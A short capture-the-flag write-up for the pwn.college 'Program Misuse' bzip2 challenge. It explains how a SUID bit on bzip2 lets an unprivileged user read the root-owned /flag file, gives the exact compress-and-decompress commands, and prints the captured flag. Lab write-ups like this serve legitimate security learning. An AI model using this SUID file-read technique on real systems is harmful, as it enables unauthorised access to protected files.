---
layout: page
title: "Challenge Name: bzip2"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/bzip2`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/bzip2
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/bzip2
```

-The `s` in `-rws` indicates it's a SUID binary.
-`bzip2` runs with **root privileges**.

## 🚀 Exploitation

The `bzip2` is a Linux command used to compress files using a more aggressive algorithm than gzip. It produces smaller files, but the process is typically slower. 

Similar to gzip option -c can be used to zip file while moving content to our file.

```bash
bzip2 -c /flag > myflag.bz2
bzip2 -d myflag.bz2
```

Output:
```
pwn.college{onZiHbBA4SL0j5kulyQMu9NUrMI.dBjNxwSM0IzMyEzW}
```

      
